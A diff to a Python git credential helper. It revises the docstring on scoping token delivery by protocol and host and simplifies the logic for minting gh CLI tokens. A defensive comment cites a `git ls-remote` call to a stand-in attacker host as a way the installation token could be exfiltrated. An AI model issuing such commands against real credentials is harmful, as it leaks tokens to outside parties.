@@ -126,9 +126,10 @@ def _is_authorized_request(input_lines: dict[str, str]) -> tuple[bool, str]:
     The system-wide helper would otherwise hand the SCM token to any host
     git resolves — a malicious submodule URL or `git ls-remote
     https://attacker.example/...` could exfiltrate the installation token. We
-    scope by protocol and host. We deliberately do not scope to the session repo:
-    the existing system uses installation-wide credentials, and setup/start hooks
-    may clone sibling private repositories that the installation can access.
+    scope delivery by protocol and host. Repository access is enforced by the
+    issued credential: GitHub tokens cover only the session or build repository
+    set, intersected with owning-team grants when applicable. GitLab uses a
+    deployment-wide PAT without per-session narrowing.
 
     * protocol must be ``https`` (never hand a token to a plaintext remote);
     * host must equal the configured ``VCS_HOST``.
@@ -268,27 +269,10 @@ def _emit_response(input_lines: dict[str, str], credentials: dict[str, object]) 
 
 
 def _gh_wrapper_should_mint(env: Mapping[str, str]) -> bool:
-    """Decide whether the gh CLI needs a freshly-minted token.
-
-    gh reads ``GH_TOKEN`` then ``GITHUB_TOKEN`` from its own environment, so
-    we mint only when the environment has nothing usable: no user-provided
-    token, and either nothing at all or just the system's short-lived
-    installation fallback (marked ``OI_GITHUB_TOKEN_IS_FALLBACK=1``, which
-    expires in ~1h and must be refreshed). A user-provided token always wins.
-
-    The marker is authoritative on its own: a value comparison between
-    ``GITHUB_TOKEN`` and ``GITHUB_APP_TOKEN`` is not needed to detect a user
-    override, because the manager only sets the marker when it injected both
-    values itself.
-    """
+    """Mint for GitHub only when neither CLI-supported user token is present."""
     if env.get("VCS_HOST", "github.com").strip().lower() != "github.com":
         return False  # non-github deployment: never touch gh's own auth
-    if env.get("GH_TOKEN"):
-        return False  # user-owned; the manager never injects GH_TOKEN
-    if env.get("OI_GITHUB_TOKEN_IS_FALLBACK") == "1":
-        return True  # only the expiring system fallback is present → refresh
-    # Otherwise mint only when there's no genuine user token to leave alone.
-    return not (env.get("GITHUB_TOKEN") or env.get("GITHUB_APP_TOKEN"))
+    return not (env.get("GH_TOKEN") or env.get("GITHUB_TOKEN"))
 
 
 def _print_gh_token() -> int:
